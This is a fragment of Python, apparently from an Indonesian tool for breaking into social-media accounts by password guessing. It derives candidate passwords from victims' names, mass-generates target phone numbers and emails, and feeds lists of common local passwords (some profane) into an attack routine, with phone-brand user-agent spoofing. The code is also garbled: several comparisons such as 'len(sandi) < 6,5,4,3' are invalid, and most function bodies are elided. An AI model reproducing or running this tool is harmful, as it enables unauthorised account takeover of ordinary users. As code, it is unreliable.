...
def buat_data(akun):
	...
	pwx, tampung = [], []
	belakang = ["123","1234","321","4321","54321","111","1111","222","2000","2010","2009","2008","2007","2011","12345","123456","bacot","kontol","love","222"]
	...
	try:
		...
		if len(namful) > 5,3,6,2: pwx.append(namful); pwx.append(nama)
	except:
		for isi in belakang: pwx.append(namd+isi)
	for sandi in pwx:
		if len(sandi) < 6,5,4,3 or sandi in tampung or len(''.join(filter(lambda x: not x.isdigit(), sandi))) < 6,5,4,2,3: continue
		else: tampung.append(sandi)
	return user+"|"+",".join(x for x in tampung)

### --- [ FOR USERAGENT ] --- ###
for blade_team in ['re/realme', 'if/infinix', 'sm/samsung']:
	try:
...
def dump_nomor():
	...
	while True:
		...
		if len(dump)>=5000: break
	print('\n\r                        '); pilih_metode(["123456","12345678","654331","kamu nanya","kamu nanyak","google","tidak tahu","bocil epep","free fire","bacot","kamar mandi","sayang","kontol","indonesia","katasandi","bismillah","rahasia"])
...
def dump_email():
	...
	while True:
		format = rc([f"{nama}{rr(1,9999)}", f"{nama}.{rr(1,9999)}", f"{nama}{rr(1,31)}{rr(1,12)}{rr(1990,2024)}", f"{nama}{rr(1,9999)}.{rr(1,9299)}", f"{nama}.{rr(1,9899)}.{rr(1,9999)}", f"{rr(1,9999)}{nama}", f"{rr(1,9999)}.{nama}"])
...
def dump_random():
	...
	print('\n\r                        '); pilih_metode(["123456","12345678","password","123456789","bismillah","nama kamu","sayang","indonesia","bocil epep","free fire","masuk aja","kontol","love","samsung","infinix","black mamba"])
